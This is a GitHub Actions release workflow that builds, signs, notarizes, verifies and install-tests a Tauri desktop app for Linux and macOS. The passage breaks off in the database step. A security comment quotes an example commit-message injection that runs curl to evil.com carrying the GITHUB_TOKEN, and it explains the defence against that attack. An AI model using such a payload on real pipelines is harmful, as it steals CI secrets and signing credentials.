name: Release Desktop

# This workflow publishes Linux x86_64 and notarized universal macOS artifacts.
# Add another target only after its build, signing, updater, smoke-test, and
# release-ingestion paths are implemented and verified together. Release copy
# and database records must describe only artifacts produced by this run.

on:
  push:
    tags:
      - 'v-desktop-*'
  workflow_dispatch:
    inputs:
      version:
        description: 'Version to release (e.g., 1.0.5)'
        required: true
        type: string
      prerelease:
        description: 'Mark as pre-release'
        required: false
        type: boolean
        default: false
      channel:
        description: 'Release channel'
        required: false
        type: choice
        options:
          - stable
          - beta
          - nightly
        default: stable

concurrency:
  group: release-desktop-${{ github.event_name == 'workflow_dispatch' && format('v-desktop-{0}', inputs.version) || github.ref_name }}
  cancel-in-progress: false

permissions:
  contents: read

env:
  RUST_VERSION: '1.94.0'
  NODE_VERSION: '24'
  PNPM_VERSION: '9.15.3'

jobs:
  # ==========================================================================
  # Prepare Release - Extract version, generate changelog, create draft release
  # ==========================================================================
  prepare-release:
    name: Prepare Release
    runs-on: ubuntu-24.04
    permissions:
      contents: write
    outputs:
      release_id: ${{ steps.create-release.outputs.release_id }}
      version: ${{ steps.get-version.outputs.version }}
      tag: ${{ steps.get-version.outputs.tag }}
      channel: ${{ steps.get-version.outputs.channel }}
      prerelease: ${{ steps.get-version.outputs.prerelease }}
      previous_tag: ${{ steps.changelog.outputs.previous_tag }}
    steps:
      - name: Checkout code
        uses: actions/checkout@v6
        with:
          fetch-depth: 0

      - name: Require release signing and updater-ingestion credentials
        env:
          TAURI_SIGNING_PRIVATE_KEY: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}
          TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}
          NEON_DATABASE_URL: ${{ secrets.NEON_DATABASE_URL }}
        run: |
          if [ -z "$TAURI_SIGNING_PRIVATE_KEY" ] || [ -z "$TAURI_SIGNING_PRIVATE_KEY_PASSWORD" ]; then
            echo "ERROR: Tauri updater signing credentials are required before a desktop release" >&2
            exit 1
          fi
          if [ -z "$NEON_DATABASE_URL" ]; then
            echo "ERROR: NEON_DATABASE_URL is required before a desktop release" >&2
            exit 1
          fi

      - name: Get version info
        id: get-version
        env:
          EVENT_NAME: ${{ github.event_name }}
          DISPATCH_VERSION: ${{ inputs.version }}
          DISPATCH_CHANNEL: ${{ inputs.channel }}
          DISPATCH_PRERELEASE: ${{ inputs.prerelease }}
        run: |
          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
            VERSION="$DISPATCH_VERSION"
            TAG="v-desktop-${VERSION}"
            CHANNEL="$DISPATCH_CHANNEL"
            PRERELEASE="$DISPATCH_PRERELEASE"
          else
            TAG="${GITHUB_REF#refs/tags/}"
            VERSION="${TAG#v-desktop-}"
            CHANNEL="stable"
            PRERELEASE="false"

            VERSION_WITHOUT_BUILD="${VERSION%%+*}"
            if [[ "$VERSION_WITHOUT_BUILD" == *-* ]]; then
              PRERELEASE="true"
              PRERELEASE_ID="${VERSION_WITHOUT_BUILD#*-}"
              PRERELEASE_ID="${PRERELEASE_ID%%.*}"
              case "$PRERELEASE_ID" in
                alpha|nightly|canary) CHANNEL="nightly" ;;
                *) CHANNEL="beta" ;;
              esac
            fi
          fi

          if ! printf '%s' "$VERSION" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z]+([.-][0-9A-Za-z]+)*)?(\+[0-9A-Za-z]+([.-][0-9A-Za-z]+)*)?$'; then
            echo "ERROR: invalid desktop release version: $VERSION" >&2
            exit 1
          fi
          if [ "$TAG" != "v-desktop-${VERSION}" ]; then
            echo "ERROR: desktop release tag must be v-desktop-${VERSION}; got $TAG" >&2
            exit 1
          fi

          VERSION_WITHOUT_BUILD="${VERSION%%+*}"
          if [[ "$VERSION_WITHOUT_BUILD" == *-* ]]; then
            HAS_PRERELEASE="true"
          else
            HAS_PRERELEASE="false"
          fi

          case "$PRERELEASE" in
            true|false) ;;
            *)
              echo "ERROR: prerelease must be true or false; got $PRERELEASE" >&2
              exit 1
              ;;
          esac
          case "$CHANNEL" in
            stable)
              if [ "$HAS_PRERELEASE" = "true" ] || [ "$PRERELEASE" != "false" ]; then
                echo "ERROR: stable channel requires a stable SemVer and prerelease=false" >&2
                exit 1
              fi
              ;;
            beta|nightly)
              if [ "$HAS_PRERELEASE" != "true" ] || [ "$PRERELEASE" != "true" ]; then
                echo "ERROR: non-stable channels require a pre-release SemVer and prerelease=true" >&2
                exit 1
              fi
              ;;
            *)
              echo "ERROR: unsupported desktop release channel: $CHANNEL" >&2
              exit 1
              ;;
          esac

          PACKAGE_VERSION=$(node -p "require('./apps/desktop/package.json').version")
          TAURI_VERSION=$(node -p "require('./apps/desktop/src-tauri/tauri.conf.json').version")
          CARGO_VERSION=$(sed -n 's/^version = "\([^"]*\)"/\1/p' apps/desktop/src-tauri/Cargo.toml | head -1)
          for source_version in "$PACKAGE_VERSION" "$TAURI_VERSION" "$CARGO_VERSION"; do
            if [ "$source_version" != "$VERSION" ]; then
              echo "ERROR: release tag $TAG does not match desktop source version $source_version" >&2
              exit 1
            fi
          done

          echo "version=${VERSION}" >> $GITHUB_OUTPUT
          echo "tag=${TAG}" >> $GITHUB_OUTPUT
          echo "channel=${CHANNEL}" >> $GITHUB_OUTPUT
          echo "prerelease=${PRERELEASE}" >> $GITHUB_OUTPUT

          echo "Version: ${VERSION}"
          echo "Tag: ${TAG}"
          echo "Channel: ${CHANNEL}"
          echo "Pre-release: ${PRERELEASE}"

      - name: Generate changelog
        id: changelog
        run: |
          # Get previous tag
          PREV_TAG=$(git describe --tags --match 'v-desktop-*' --abbrev=0 HEAD^ 2>/dev/null || echo "")

          if [ -z "$PREV_TAG" ]; then
            CHANGELOG="Initial release"
          else
            # Generate changelog from commits
            CHANGELOG=$(git log --pretty=format:"- %s (%h)" ${PREV_TAG}..HEAD -- apps/desktop/ | head -50)

            if [ -z "$CHANGELOG" ]; then
              CHANGELOG="Bug fixes and improvements"
            fi
          fi

          # Use heredoc syntax for multi-line output
          {
            echo "changelog<<CHANGELOG_EOF"
            echo "$CHANGELOG"
            echo "CHANGELOG_EOF"
            echo "previous_tag=${PREV_TAG}"
          } >> $GITHUB_OUTPUT

      - name: Create draft release
        id: create-release
        uses: actions/github-script@v9
        env:
          VERSION: ${{ steps.get-version.outputs.version }}
          TAG: ${{ steps.get-version.outputs.tag }}
          PRERELEASE: ${{ steps.get-version.outputs.prerelease }}
          CHANNEL: ${{ steps.get-version.outputs.channel }}
          # SECURITY (C1, redteam-services 2026-05-04): Pass changelog via env, NEVER
          # via ${{ ... }} interpolation in the script body. Commit subjects flow
          # into this string from `git log` and an attacker could craft
          # `feat: x ${require('child_process').execSync('curl evil.com?t='+process.env.GITHUB_TOKEN)}`
          # which would execute on the runner with secrets exposed (TAURI_*, NEON_*, APPLE_*).
          # Reading from process.env keeps the value as a plain string, JS template
          # literal evaluation only happens against the literal text we author below.
          CHANGELOG: ${{ steps.changelog.outputs.changelog }}
          PREVIOUS_TAG: ${{ steps.changelog.outputs.previous_tag }}
        with:
          script: |
            const version = process.env.VERSION;
            const tag = process.env.TAG;
            const prerelease = process.env.PRERELEASE === 'true';
            const channel = process.env.CHANNEL;
            const changelog = process.env.CHANGELOG ?? '';
            const previousTag = process.env.PREVIOUS_TAG ?? '';

            const channelBadge = channel !== 'stable' ? ` [${channel.toUpperCase()}]` : '';
            const comparison = previousTag
              ? `\n**Full changelog:** https://github.com/${context.repo.owner}/${context.repo.repo}/compare/${previousTag}...${tag}`
              : '';

            const releaseBody = `## AGI Workforce ${version}${channelBadge}

            ### What's New

            ${changelog}

            ### Downloads

            | Platform | Architecture | Download |
            |----------|--------------|----------|
            | Linux | x86_64 | \`.AppImage\` plus Tauri updater signature, or \`.deb\` installer |
            | macOS | Universal (Apple Silicon + Intel) | Notarized \`.dmg\`, or signed \`.app.tar.gz\` updater |

            ### Installation

            On macOS, download the notarized \`.dmg\`, open it, and move AGI to Applications. For the portable Linux build, download the \`.AppImage\`, make it executable (\`chmod +x <file>.AppImage\`), and run it. On Debian or Ubuntu, download the \`.deb\` and install it with \`sudo apt install ./<file>.deb\`.

            ### Auto-Updates

            Supported Linux and macOS installations can discover their signed updater artifact through the configured AGI update endpoint.

            ---
            ${comparison}
            `;

            const { data } = await github.rest.repos.createRelease({
              owner: context.repo.owner,
              repo: context.repo.repo,
              tag_name: tag,
              name: `AGI Workforce v${version}${channelBadge}`,
              body: releaseBody,
              draft: true,
              prerelease: prerelease
            });

            core.setOutput('release_id', data.id);
            return data.id;

  # ==========================================================================
  # Validate - Lint, type check, and test before build
  # ==========================================================================
  validate:
    needs: [prepare-release]
    runs-on: ubuntu-24.04
    timeout-minutes: 45
    steps:
      - name: Checkout repository
        uses: actions/checkout@v6
      - name: Setup pnpm
        uses: pnpm/action-setup@fc06bc1257f339d1d5d8b3a19a8cae5388b55320 # v5
        with:
          version: 9.15.3
      - name: Setup Node.js
        uses: actions/setup-node@v6
        with:
          node-version: '24'
          cache: 'pnpm'
      - name: Install dependencies
        run: pnpm install --frozen-lockfile
      - name: Lint
        run: pnpm lint
      - name: Lint VS Code extension
        run: pnpm lint:extension
      - name: Type check
        run: pnpm typecheck:all
      - name: Test
        run: pnpm test

  # ==========================================================================
  # Build Linux - x86_64 AppImage and Debian package
  # ==========================================================================
  build-linux:
    name: Build Linux
    needs: [prepare-release, validate]
    runs-on: ubuntu-22.04
    permissions:
      contents: write
    timeout-minutes: 60
    steps:
      - name: Checkout code
        uses: actions/checkout@v6

      - name: Setup pnpm
        uses: pnpm/action-setup@fc06bc1257f339d1d5d8b3a19a8cae5388b55320 # v5
        with:
          version: ${{ env.PNPM_VERSION }}

      - name: Setup Node.js
        uses: actions/setup-node@v6
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: 'pnpm'

      - name: Setup Rust
        uses: actions-rust-lang/setup-rust-toolchain@166cdcfd11aee3cb47222f9ddb555ce30ddb9659 # v1.17.0
        with:
          toolchain: ${{ env.RUST_VERSION }}

      - name: Install Linux dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y \
            libwebkit2gtk-4.1-dev \
            build-essential \
            curl \
            wget \
            file \
            libxdo-dev \
            libssl-dev \
            libayatana-appindicator3-dev \
            librsvg2-dev \
            pkg-config \
            libleptonica-dev \
            libpng-dev \
            libjpeg-dev \
            libtiff-dev \
            zlib1g-dev \
            libwebp-dev \
            libasound2-dev \
            libclang-dev \
            minisign

      - name: Cache Rust dependencies
        uses: Swatinem/rust-cache@6323deb102c322ba6fcbdcafc7e3dddab59af2b6 # v2.9.2
        with:
          workspaces: 'apps/desktop/src-tauri -> target'
          cache-on-failure: true

      - name: Install JavaScript dependencies
        run: pnpm install --frozen-lockfile

      # C1: Mask signing secrets in logs before they reach the build step
      - name: Mask Tauri signing secrets
        run: |
          echo "::add-mask::${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}"
          echo "::add-mask::${{ secrets.TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}"

      - name: Build web frontend
        # H27: --max-old-space-size=8192 is intentional; ubuntu-22.04 runners have 7 GB RAM
        run: echo "NODE_OPTIONS=--max-old-space-size=8192" >> $GITHUB_ENV && pnpm --filter @agiworkforce/desktop run build:web

      - name: Build native messaging host sidecar
        run: pnpm --filter @agiworkforce/desktop run build:native-host

      - name: Build Tauri app
        # H28: Pinned to @v0 major-version tag (commit 73fb865 = v0.6.1); avoids floating SHA
        # C1: Signing keys are masked above; passed via env: (tauri-action reads TAURI_SIGNING_* from env)
        uses: tauri-apps/tauri-action@84b9d35b5fc46c1e45415bdb6144030364f7ebc5 # v0.6.2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          TAURI_SIGNING_PRIVATE_KEY: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}
          TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}
          CI: 'true'
        with:
          projectPath: apps/desktop
          releaseId: ${{ needs.prepare-release.outputs.release_id }}
          # This monorepo publishes CLI and desktop releases. The action's
          # releaseId-only latest.json would point at cross-product
          # /releases/latest; AGI's target-scoped updater API is canonical.
          includeUpdaterJson: false
          args: --bundles appimage,deb

      - name: Verify Linux release artifacts
        shell: bash
        run: |
          shopt -s nullglob
          appimages=(target/release/bundle/appimage/*.AppImage)
          signatures=(target/release/bundle/appimage/*.AppImage.sig)
          debs=(target/release/bundle/deb/*.deb)
          if [ "${#appimages[@]}" -ne 1 ] || [ "${#signatures[@]}" -ne 1 ]; then
            echo "ERROR: expected exactly one AppImage and one Tauri updater signature" >&2
            exit 1
          fi
          if [ "${#debs[@]}" -ne 1 ]; then
            echo "ERROR: expected exactly one Debian package" >&2
            exit 1
          fi
          if [ ! -s "${appimages[0]}" ] || [ ! -s "${signatures[0]}" ]; then
            echo "ERROR: AppImage updater artifact pair contains an empty file" >&2
            exit 1
          fi
          if [ ! -s "${debs[0]}" ]; then
            echo "ERROR: Debian package is empty" >&2
            exit 1
          fi
          dpkg-deb --info "${debs[0]}" >/dev/null

          public_key_file="${RUNNER_TEMP}/agi-updater.pub"
          node - "$public_key_file" <<'NODE'
          const fs = require('node:fs');
          const config = require('./apps/desktop/src-tauri/tauri.conf.json');
          const encoded = config.plugins?.updater?.pubkey;
          if (typeof encoded !== 'string' || encoded.length === 0) {
            throw new Error('committed Tauri updater public key is missing');
          }
          const decoded = Buffer.from(encoded, 'base64');
          if (!decoded.toString('utf8').includes('minisign public key')) {
            throw new Error('committed Tauri updater public key is invalid');
          }
          fs.writeFileSync(process.argv[2], decoded);
          NODE
          minisign -Vm "${appimages[0]}" -x "${signatures[0]}" -p "$public_key_file"

      - name: Generate Linux release SBOM
        env:
          VERSION: ${{ needs.prepare-release.outputs.version }}
        run: |
          set -euo pipefail
          mkdir -p sbom
          pnpm --filter @agiworkforce/desktop list --prod --depth Infinity --json > sbom/linux-npm-tree.json
          node scripts/generate-sbom.mjs \
            --component agiworkforce-desktop-linux-x86_64 \
            --version "$VERSION" \
            --cargo-lock Cargo.lock \
            --node-tree sbom/linux-npm-tree.json \
            --out "sbom/agiworkforce-desktop-${VERSION}-linux-x86_64.cdx.json"
          rm sbom/linux-npm-tree.json

      - name: Upload build artifacts
        uses: actions/upload-artifact@v7
        with:
          name: linux-x64-artifacts
          path: |
            target/release/bundle/appimage/*.AppImage
            target/release/bundle/appimage/*.AppImage.sig
            target/release/bundle/deb/*.deb
            sbom/*.cdx.json
          retention-days: 7

  # ==========================================================================
  # Build macOS - notarized universal DMG and signed updater archive
  # ==========================================================================
  build-macos:
    name: Build notarized macOS universal release
    needs: [prepare-release, validate]
    runs-on: macos-15
    timeout-minutes: 120
    environment:
      name: macos-release
      url: https://appstoreconnect.apple.com/access/integrations/api
    permissions:
      contents: write
    steps:
      - name: Checkout code
        uses: actions/checkout@v6

      - name: Setup pnpm
        uses: pnpm/action-setup@fc06bc1257f339d1d5d8b3a19a8cae5388b55320 # v5
        with:
          version: ${{ env.PNPM_VERSION }}

      - name: Setup Node.js
        uses: actions/setup-node@v6
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: 'pnpm'

      - name: Setup Rust and both macOS targets
        uses: actions-rust-lang/setup-rust-toolchain@166cdcfd11aee3cb47222f9ddb555ce30ddb9659 # v1.17.0
        with:
          toolchain: ${{ env.RUST_VERSION }}
          target: aarch64-apple-darwin,x86_64-apple-darwin

      - name: Cache Rust dependencies
        uses: Swatinem/rust-cache@6323deb102c322ba6fcbdcafc7e3dddab59af2b6 # v2.9.2
        with:
          workspaces: 'apps/desktop/src-tauri -> target'
          cache-on-failure: true

      - name: Install JavaScript and verification dependencies
        run: |
          pnpm install --frozen-lockfile
          brew install minisign

      - name: Require Apple signing and notarization credentials
        env:
          APPLE_CERTIFICATE: ${{ secrets.APPLE_CERTIFICATE }}
          APPLE_CERTIFICATE_PASSWORD: ${{ secrets.APPLE_CERTIFICATE_PASSWORD }}
          APPLE_API_KEY: ${{ secrets.APPLE_API_KEY }}
          APPLE_API_ISSUER: ${{ secrets.APPLE_API_ISSUER }}
          APPLE_API_PRIVATE_KEY: ${{ secrets.APPLE_API_PRIVATE_KEY }}
          TAURI_SIGNING_PRIVATE_KEY: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}
          TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}
        run: |
          set -euo pipefail
          for name in APPLE_CERTIFICATE APPLE_CERTIFICATE_PASSWORD APPLE_API_KEY APPLE_API_ISSUER APPLE_API_PRIVATE_KEY TAURI_SIGNING_PRIVATE_KEY TAURI_SIGNING_PRIVATE_KEY_PASSWORD; do
            if [ -z "${!name}" ]; then
              echo "ERROR: macos-release secret ${name} is required" >&2
              exit 1
            fi
          done

          key_path="${RUNNER_TEMP}/AuthKey_${APPLE_API_KEY}.p8"
          printf '%s' "$APPLE_API_PRIVATE_KEY" | openssl base64 -d -A -out "$key_path"
          chmod 600 "$key_path"
          if ! grep -q -- '-----BEGIN PRIVATE KEY-----' "$key_path"; then
            echo "ERROR: APPLE_API_PRIVATE_KEY is not a base64-encoded App Store Connect .p8 key" >&2
            exit 1
          fi
          echo "APPLE_API_KEY_PATH=${key_path}" >> "$GITHUB_ENV"

      - name: Build, sign, notarize, and staple macOS bundles
        uses: tauri-apps/tauri-action@84b9d35b5fc46c1e45415bdb6144030364f7ebc5 # v0.6.2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          APPLE_CERTIFICATE: ${{ secrets.APPLE_CERTIFICATE }}
          APPLE_CERTIFICATE_PASSWORD: ${{ secrets.APPLE_CERTIFICATE_PASSWORD }}
          APPLE_API_KEY: ${{ secrets.APPLE_API_KEY }}
          APPLE_API_ISSUER: ${{ secrets.APPLE_API_ISSUER }}
          TAURI_SIGNING_PRIVATE_KEY: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}
          TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}
          CI: 'true'
        with:
          projectPath: apps/desktop
          releaseId: ${{ needs.prepare-release.outputs.release_id }}
          includeUpdaterJson: false
          args: --target universal-apple-darwin --bundles app,dmg

      - name: Verify notarized universal app, DMG, and updater archive
        shell: bash
        env:
          EXPECTED_VERSION: ${{ needs.prepare-release.outputs.version }}
        run: |
          set -euo pipefail
          shopt -s nullglob
          bundle_root="target/universal-apple-darwin/release/bundle"
          apps=("${bundle_root}/macos/"*.app)
          updaters=("${bundle_root}/macos/"*.app.tar.gz)
          signatures=("${bundle_root}/macos/"*.app.tar.gz.sig)
          dmgs=("${bundle_root}/dmg/"*.dmg)
          if [ "${#apps[@]}" -ne 1 ] || [ "${#updaters[@]}" -ne 1 ] || [ "${#signatures[@]}" -ne 1 ] || [ "${#dmgs[@]}" -ne 1 ]; then
            echo "ERROR: expected one .app, .app.tar.gz, updater signature, and .dmg" >&2
            exit 1
          fi
          for artifact in "${updaters[0]}" "${signatures[0]}" "${dmgs[0]}"; do
            if [ ! -s "$artifact" ]; then
              echo "ERROR: empty macOS release artifact: $artifact" >&2
              exit 1
            fi
          done

          app_path="${apps[0]}"
          plist_path="${app_path}/Contents/Info.plist"
          executable_name=$(/usr/libexec/PlistBuddy -c 'Print :CFBundleExecutable' "$plist_path")
          bundle_version=$(/usr/libexec/PlistBuddy -c 'Print :CFBundleShortVersionString' "$plist_path")
          if [ "$bundle_version" != "$EXPECTED_VERSION" ]; then
            echo "ERROR: macOS bundle version ${bundle_version} does not match ${EXPECTED_VERSION}" >&2
            exit 1
          fi

          main_executable="${app_path}/Contents/MacOS/${executable_name}"
          sidecars=("${app_path}/Contents/MacOS/"native_messaging_host*)
          if [ "${#sidecars[@]}" -ne 1 ]; then
            echo "ERROR: expected exactly one bundled native messaging host" >&2
            exit 1
          fi
          lipo "$main_executable" -verify_arch arm64 x86_64
          lipo "${sidecars[0]}" -verify_arch arm64 x86_64

          codesign --verify --deep --strict --verbose=2 "$app_path"
          signature_info=$(codesign -d --verbose=4 "$app_path" 2>&1)
          printf '%s\n' "$signature_info" | grep -F 'Authority=Developer ID Application: AGI AUTOMATION LLC (D2PR62RLT4)'
          printf '%s\n' "$signature_info" | grep -F 'TeamIdentifier=D2PR62RLT4'
          printf '%s\n' "$signature_info" | grep -E 'flags=.*runtime'
          spctl --assess --type execute --verbose=4 "$app_path"
          xcrun stapler validate "$app_path"

          codesign --verify --strict --verbose=2 "${dmgs[0]}"
          xcrun stapler validate "${dmgs[0]}"
          tar -tzf "${updaters[0]}" >/dev/null

          public_key_file="${RUNNER_TEMP}/agi-updater.pub"
          node - "$public_key_file" <<'NODE'
          const fs = require('node:fs');
          const config = require('./apps/desktop/src-tauri/tauri.conf.json');
          const encoded = config.plugins?.updater?.pubkey;
          if (typeof encoded !== 'string' || encoded.length === 0) {
            throw new Error('committed Tauri updater public key is missing');
          }
          const decoded = Buffer.from(encoded, 'base64');
          if (!decoded.toString('utf8').includes('minisign public key')) {
            throw new Error('committed Tauri updater public key is invalid');
          }
          fs.writeFileSync(process.argv[2], decoded);
          NODE
          minisign -Vm "${updaters[0]}" -x "${signatures[0]}" -p "$public_key_file"

      - name: Generate macOS release SBOM
        env:
          VERSION: ${{ needs.prepare-release.outputs.version }}
        run: |
          set -euo pipefail
          mkdir -p sbom
          pnpm --filter @agiworkforce/desktop list --prod --depth Infinity --json > sbom/macos-npm-tree.json
          node scripts/generate-sbom.mjs \
            --component agiworkforce-desktop-universal-apple-darwin \
            --version "$VERSION" \
            --cargo-lock Cargo.lock \
            --node-tree sbom/macos-npm-tree.json \
            --out "sbom/agiworkforce-desktop-${VERSION}-universal-apple-darwin.cdx.json"
          rm sbom/macos-npm-tree.json

      - name: Upload verified macOS artifacts
        uses: actions/upload-artifact@v7
        with:
          name: macos-universal-artifacts
          path: |
            target/universal-apple-darwin/release/bundle/macos/*.app.tar.gz
            target/universal-apple-darwin/release/bundle/macos/*.app.tar.gz.sig
            target/universal-apple-darwin/release/bundle/dmg/*.dmg
            sbom/*.cdx.json
          if-no-files-found: error
          retention-days: 7

  # ==========================================================================
  # Clean-machine install - install the built package on a bare Ubuntu image
  # ==========================================================================
  clean-install-linux:
    name: Install on a clean machine
    needs: [prepare-release, build-linux]
    runs-on: ubuntu-24.04
    container:
      image: ubuntu:24.04
    timeout-minutes: 30
    steps:
      - name: Download the built Linux artifacts
        uses: actions/download-artifact@v8
        with:
          name: linux-x64-artifacts
          path: artifacts

      - name: Install the Debian package with no build toolchain present
        shell: bash
        env:
          DEBIAN_FRONTEND: noninteractive
          EXPECTED_VERSION: ${{ needs.prepare-release.outputs.version }}
        run: |
          set -euo pipefail
          apt-get update
          apt-get install -y --no-install-recommends ca-certificates

          deb=$(find artifacts -name '*.deb' -type f | head -1)
          if [ -z "$deb" ]; then
            echo "ERROR: no Debian package was published for this release" >&2
            exit 1
          fi

          package_name=$(dpkg-deb -f "$deb" Package)
          package_version=$(dpkg-deb -f "$deb" Version)
          if [ "${package_version%%-*}" != "$EXPECTED_VERSION" ]; then
            echo "ERROR: package version ${package_version} does not match release ${EXPECTED_VERSION}" >&2
            exit 1
          fi

          apt-get install -y "./${deb#./}"
          installed=$(dpkg-query -W -f='${Version}' "$package_name")
          if [ "$installed" != "$package_version" ]; then
            echo "ERROR: dpkg reports ${installed} after installing ${package_version}" >&2
            exit 1
          fi

          echo "PACKAGE_NAME=${package_name}" >> "$GITHUB_ENV"

      - name: Prove the installed binary resolves every shared library
        shell: bash
        run: |
          set -euo pipefail
          binary=$(dpkg -L "$PACKAGE_NAME" | grep '^/usr/bin/' | head -1)
          if [ -z "$binary" ] || [ ! -x "$binary" ]; then
            echo "ERROR: the package installed no executable under /usr/bin" >&2
            exit 1
          fi
          missing=$(ldd "$binary" | grep 'not found' || true)
          if [ -n "$missing" ]; then
            echo "ERROR: the release depends on libraries a clean machine does not have:" >&2
            printf '%s\n' "$missing" >&2
            exit 1
          fi
          if ! dpkg -L "$PACKAGE_NAME" | grep -q '\.desktop$'; then
            echo "ERROR: the package installs no desktop entry, so it is unlaunchable" >&2
            exit 1
          fi

      - name: Require an SBOM alongside the installable artifact
        shell: bash
        run: |
          set -euo pipefail
          sbom=$(find artifacts -name '*.cdx.json' -type f | head -1)
          if [ -z "$sbom" ] || [ ! -s "$sbom" ]; then
            echo "ERROR: the Linux release shipped without an SBOM" >&2
            exit 1
          fi
          grep -q '"bomFormat": "CycloneDX"' "$sbom"

  # ==========================================================================
  # Upgrade path - install the previous published release, upgrade, roll back
  # ==========================================================================
  upgrade-from-previous-linux:
    name: Upgrade from the previous release and roll back
    needs: [prepare-release, build-linux]
    runs-on: ubuntu-24.04
    timeout-minutes: 45
    permissions:
      contents: read
    steps:
      - name: Checkout code
        uses: actions/checkout@v6

      - name: Setup Node.js
        uses: actions/setup-node@v6
        with:
          node-version: ${{ env.NODE_VERSION }}

      - name: Download the built Linux artifacts
        uses: actions/download-artifact@v8
        with:
          name: linux-x64-artifacts
          path: artifacts

      - name: Install the previously published release
        id: previous
        shell: bash
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          PREVIOUS_TAG: ${{ needs.prepare-release.outputs.previous_tag }}
        run: |
          set -euo pipefail
          if [ -z "$PREVIOUS_TAG" ]; then
            echo "No previously published desktop release exists; nothing to upgrade from."
            echo "have_previous=false" >> "$GITHUB_OUTPUT"
            exit 0
          fi
          mkdir -p previous
          gh release download "$PREVIOUS_TAG" --repo "$GITHUB_REPOSITORY" --pattern '*.deb' --dir previous
          previous_deb=$(find previous -name '*.deb' -type f | head -1)
          if [ -z "$previous_deb" ]; then
            echo "ERROR: ${PREVIOUS_TAG} published no Debian package to upgrade from" >&2
            exit 1
          fi
          sudo apt-get update
          sudo apt-get install -y xvfb "./${previous_deb#./}"
          echo "have_previous=true" >> "$GITHUB_OUTPUT"
          echo "previous_deb=${previous_deb}" >> "$GITHUB_OUTPUT"

      - name: Seed user data with the previous release
        if: steps.previous.outputs.have_previous == 'true'
        shell: bash
        run: |
          set -euo pipefail
          identifier=$(node -p "require('./apps/desktop/src-tauri/tauri.conf.json').identifier")
          data_root="${RUNNER_TEMP}/xdg-data"
          data_dir="${data_root}/${identifier}"
          mkdir -p "$data_dir/upgrade-probe"
          printf 'model-cache-payload' > "$data_dir/upgrade-probe/model-cache.bin"
          printf '{"theme":"dark"}' > "$data_dir/upgrade-probe/config.json"
          echo "XDG_DATA_HOME=${data_root}" >> "$GITHUB_ENV"
          echo "AGI_DATA_DIR=${data_dir}" >> "$GITHUB_ENV"

          package_name=$(dpkg-deb -f "${{ steps.previous.outputs.previous_deb }}" Package)
          binary=$(dpkg -L "$package_name" | grep '^/usr/bin/' | head -1)
          echo "AGI_BINARY=${binary}" >> "$GITHUB_ENV"
          xvfb-run -a timeout 120 "$binary" || true
          node scripts/verify-desktop-upgrade.mjs snapshot \
            --data-dir "$data_dir" \
            --database agiworkforce.db \
            --out "${RUNNER_TEMP}/before.json"

      - name: Upgrade to this release and prove nothing was lost
        if: steps.previous.outputs.have_previous == 'true'
        shell: bash
        run: |
          set -euo pipefail
          deb=$(find artifacts -name '*.deb' -type f | head -1)
          sudo apt-get install -y "./${deb#./}"
          xvfb-run -a timeout 120 "$AGI_BINARY" || true
          node scripts/verify-desktop-upgrade.mjs snapshot \
            --data-dir "$AGI_DATA_DIR" \
            --database agiworkforce.db \
            --out "${RUNNER_TEMP}/after.json"
          node scripts/verify-desktop-upgrade.mjs compare \
            --before "${RUNNER_TEMP}/before.json" \
            --after "${RUNNER_TEMP}/after.json" \
            --preserve upgrade-probe/model-cache.bin,upgrade-probe/config.json

      - name: Roll back to the previous release and prove it still opens the data
        if: steps.previous.outputs.have_previous == 'true'
        shell: bash
        run: |
          set -euo pipefail
          sudo apt-get install -y --allow-downgrades "./${{ steps.previous.outputs.previous_deb }}"
          xvfb-run -a timeout 120 "$AGI_BINARY" || true
          node scripts/verify-desktop-upgrade.mjs snapshot \
            --data-dir "$AGI_DATA_DIR" \
            --database agiworkforce.db \
            --out "${RUNNER_TEMP}/rollback.json"
          node scripts/verify-desktop-upgrade.mjs compare --rollback true \
            --before "${RUNNER_TEMP}/after.json" \
            --after "${RUNNER_TEMP}/rollback.json" \
            --preserve upgrade-probe/model-cache.bin,upgrade-probe/config.json

  # ==========================================================================
  # Update Release Database - Store release info in Neon
  # ==========================================================================
  update-database:
    name: Update Release Database
    # Ingest only after GitHub serves the artifact URL. Publishing database
    # metadata first creates an updater-visible 404 window and leaves a stale
    # row when draft publication fails.
    needs: [prepare-release, build-linux, build-macos, publish-release]
    runs-on: ubuntu-24.04
    steps:
      - name: Checkout code
        uses: actions/checkout@v6

      - name: Setup Node.js
        uses: actions/setup-node@v6
        with:
          node-version: ${{ env.NODE_VERSION }}

      - name: Download all artifacts
        uses: actions/download-artifact@v8
        with:
          path: artifacts

      - name: Mask sensitive secrets
        run: |
          echo "::add-mask::${{ secrets.NEON_DATABASE_URL }}"

      - name: Install Neon database driver
        run: npm install --no-save @neondatabase/serverless@1.1.0

      - name: Update release database
        env:
          NEON_DATABASE_URL: ${{ secrets.NEON_DATABASE_URL }}
          VERSION: ${{ needs.prepare-release.outputs.version }}
          TAG: ${{ needs.prepare-release.outputs.tag }}
          CHANNEL: ${{ needs.prepare-release.outputs.channel }}
          PRERELEASE: ${{ needs.prepare-release.outputs.prerelease }}
          GITHUB_REPO: ${{ github.repository }}
        run: |
          PUB_DATE=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
